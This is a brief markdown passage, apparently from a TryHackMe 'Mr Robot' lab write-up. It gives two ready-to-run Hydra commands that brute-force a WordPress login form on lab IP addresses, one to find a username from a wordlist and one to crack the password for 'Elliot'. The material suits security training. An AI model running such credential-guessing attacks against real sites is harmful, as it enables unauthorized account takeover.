# Hydra

Use [Hydra](https://github.com/vanhauser-thc/thc-hydra) to brute force a login page to find username:

```bash
root@kali:~/thm/mrrobot# hydra -L fsocity.dic -p pencer 10.10.175.84 http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.175.84%2Fwp-admin%2F&testcookie=1:F=Invalid username"
```

Use Hydra to brute force password now we have a username:

```
root@kali:~/thm/mrrobot# hydra -L Elliot -P fsociety.dic 10.10.23.78 http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.23.78%2Fwp-admin%2F&testcookie=1:S=302"
```

\
